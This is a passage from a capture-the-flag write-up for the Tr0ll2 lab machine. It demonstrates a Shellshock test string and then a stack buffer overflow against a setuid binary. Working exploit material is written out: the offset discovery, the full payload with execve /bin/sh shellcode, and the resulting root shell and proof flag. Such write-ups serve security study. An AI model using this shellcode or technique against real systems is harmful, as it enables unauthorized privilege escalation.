</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">a</span> <span class="n">function</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">export</span> <span class="n">shocking</span><span class="o">=</span><span class="s">&#39;() { echo &quot;This is safe&quot; ; }; echo &quot;This is NOT safe&quot;&#39;</span>
</span><span class='line'><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="n">shocking</span>
</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">NOT</span> <span class="n">safe</span>
</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">safe</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway.</p>

<p>Next, the attack fools the shell into accepting a bogus function definition. You can use <a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">this string</a> to see if your bash is vulnerable to Shellshock: <code>x=&lsquo;() { :;}; echo VULNERABLE&rsquo; bash -c :</code>.</p>

<p>Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(<a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b</a>) that does nothing. So, to the vulnerable shell, the function definition doesn&rsquo;t perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.</p>

<p>Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
</span><span class='line'><span class="n">command</span><span class="o">=</span><span class="s">&quot;echo TRY HARDER LOL!&quot;</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G</span><span class="o">/</span><span class="n">kLMyjm</span><span class="o">/</span><span class="n">rrcQymKVqy4EgUyJ</span><span class="o">+</span><span class="mi">3</span><span class="n">Oyv7D5QV73IWECguqrINI</span><span class="o">+</span><span class="n">OuY</span><span class="o">+</span><span class="n">zIV49ykebBYR15HkBYi</span><span class="o">/</span><span class="mi">9</span><span class="n">GYZmHRD5CHq9I</span><span class="o">+</span><span class="n">zCLHv</span><span class="o">/</span><span class="mi">9</span><span class="n">Kdf9Ae</span><span class="o">+</span><span class="n">HQIaF</span><span class="o">/</span><span class="n">X</span><span class="o">/</span><span class="mi">3</span><span class="n">PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9</span><span class="o">/</span><span class="n">LXVOHfcrCZyyCc</span><span class="o">+</span><span class="n">ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9</span><span class="o">+</span><span class="n">ohdZBgGVncc1ngtW0b7mKf1u</span><span class="o">+</span><span class="n">RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69</span> <span class="n">noob</span><span class="nd">@Tr0ll2</span>
</span></code></pre></td></tr></table></div></figure>


<p>There it is, the trolling message was the command that user noob was restricted to. Ok, let&rsquo;s move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ls</span> <span class="o">/</span>
</span><span class='line'><span class="nb">bin</span>   <span class="n">dev</span>  <span class="n">home</span>        <span class="n">lib</span>      <span class="n">media</span>  <span class="n">nothing_to_see_here</span>  <span class="n">proc</span>  <span class="n">run</span>   <span class="n">selinux</span>  <span class="n">sys</span>  <span class="n">usr</span>  <span class="n">vmlinuz</span>
</span><span class='line'><span class="n">boot</span>  <span class="n">etc</span>  <span class="n">initrd</span><span class="o">.</span><span class="n">img</span>  <span class="n">lost</span><span class="o">+</span><span class="n">found</span>  <span class="n">mnt</span>   <span class="n">opt</span>               <span class="n">root</span>  <span class="n">sbin</span>  <span class="n">srv</span>     <span class="n">tmp</span>  <span class="n">var</span>
</span></code></pre></td></tr></table></div></figure>


<p>Didn&rsquo;t expect to get anything out of this, but..trolls..</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="nb">file</span> <span class="n">nothing_to_see_here</span><span class="o">/</span>
</span><span class='line'><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">directory</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="n">nothing_to_see_here</span><span class="o">/</span>
</span><span class='line'><span class="n">total</span> <span class="mi">4</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="n">choose_wisely</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span> <span class="o">*</span>
</span><span class='line'><span class="n">door1</span><span class="p">:</span>
</span><span class='line'><span class="n">total</span> <span class="mi">16</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">7271</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="n">r00t</span>
</span><span class='line'>
</span><span class='line'><span class="n">door2</span><span class="p">:</span>
</span><span class='line'><span class="n">total</span> <span class="mi">20</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">8401</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="n">r00t</span>
</span><span class='line'>
</span><span class='line'><span class="n">door3</span><span class="p">:</span>
</span><span class='line'><span class="n">total</span> <span class="mi">16</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">7273</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="n">r00t</span>
</span></code></pre></td></tr></table></div></figure>


<p>I expanded the list of files in these directories so I could see everything at a glance. Let&rsquo;s see what we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="nb">file</span> <span class="n">r00t</span>
</span><span class='line'><span class="n">r00t</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">Intel</span> <span class="mi">80386</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span> <span class="p">(</span><span class="n">uses</span> <span class="n">shared</span> <span class="n">libs</span><span class="p">),</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">24</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mh">0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span>
</span><span class='line'><span class="n">Usage</span><span class="p">:</span> <span class="o">./</span><span class="n">r00t</span> <span class="nb">input</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span> <span class="n">lol</span>
</span><span class='line'><span class="n">lol</span>
</span></code></pre></td></tr></table></div></figure>


<p>This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door2</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span>
</span><span class='line'><span class="n">Good</span> <span class="n">job</span><span class="p">,</span> <span class="n">stand</span> <span class="n">by</span><span class="p">,</span> <span class="n">executing</span> <span class="n">root</span> <span class="n">shell</span><span class="o">...</span>
</span><span class='line'><span class="n">BUHAHAHA</span> <span class="n">NOOB</span><span class="err">!</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door2</span><span class="err">$</span>
</span><span class='line'><span class="n">Broadcast</span> <span class="n">message</span> <span class="kn">from</span> <span class="nn">noob</span><span class="nd">@Tr0ll2</span>
</span><span class='line'>  <span class="p">(</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span> <span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">57</span> <span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">The</span> <span class="n">system</span> <span class="ow">is</span> <span class="n">going</span> <span class="n">down</span> <span class="k">for</span> <span class="n">reboot</span> <span class="n">NOW</span><span class="err">!</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span><span class="o">.</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t 
</span><span class='line'>
</span><span class='line'>2 MINUTE HARD MODE LOL</span></code></pre></td></tr></table></div></figure>


<p>Wasn&rsquo;t sure what this one did, until I got a permission denied when running ls :&ndash;) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x6a413969 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see where exactly in the pattern it happens:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
</span><span class='line'>[*] Exact match at offset 268</span></code></pre></td></tr></table></div></figure>


<p>Taking a closer look at the registers and stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")
</span><span class='line'>
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x42424242 in ?? ()
</span><span class='line'>(gdb) info r
</span><span class='line'>eax            0x120  288
</span><span class='line'>ecx            0x0    0
</span><span class='line'>edx            0x0    0
</span><span class='line'>ebx            0xb7fd1ff4 -1208147980
</span><span class='line'>esp            0xbffffb50 0xbffffb50
</span><span class='line'>ebp            0x41414141 0x41414141
</span><span class='line'>esi            0x0    0
</span><span class='line'>edi            0x0    0
</span><span class='line'>eip            0x42424242 0x42424242
</span><span class='line'>eflags         0x210286   [ PF SF IF RF ID ]
</span><span class='line'>cs             0x73   115
</span><span class='line'>ss             0x7b   123
</span><span class='line'>ds             0x7b   123
</span><span class='line'>es             0x7b   123
</span><span class='line'>fs             0x0    0
</span><span class='line'>gs             0x33   51
</span><span class='line'>(gdb) x $esp
</span><span class='line'>0xbffffb50:   0x43434343</span></code></pre></td></tr></table></div></figure>


<p>ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the <a href="https://www.exploit-db.com/exploits/40131/">Linux x86 execve /bin/sh</a> shellcode, which is 19 bytes long.</p>

<p>What we have now for a functional exploit:</p>

<ul>
<li><p>268 bytes to fill the buffer</p></li>
<li><p>overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code></p></li>
<li><p>NOP sled for padding</p></li>
<li><p>shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code></p></li>
</ul>


<p>Ran the exploit in GDB:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
</span><span class='line'>process 1838 is executing new program: /bin/dash
</span><span class='line'>$ id
</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)</span></code></pre></td></tr></table></div></figure>


<p>Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn&rsquo;t work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x90\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
</span><span class='line'># id
</span><span class='line'>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
</span><span class='line'># ls /root/   
</span><span class='line'>Proof.txt  core1  core2  core3    core4  goal  hardmode  lmao.zip  ran_dir.py  reboot
</span><span class='line'># cat /root/Proof.txt
</span><span class='line'>You win this time young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4  </span></code></pre></td></tr></table></div></figure>


<p>The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ A visit to a fresh place will bring \
</span><span class='line'>\ strange work.                       /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
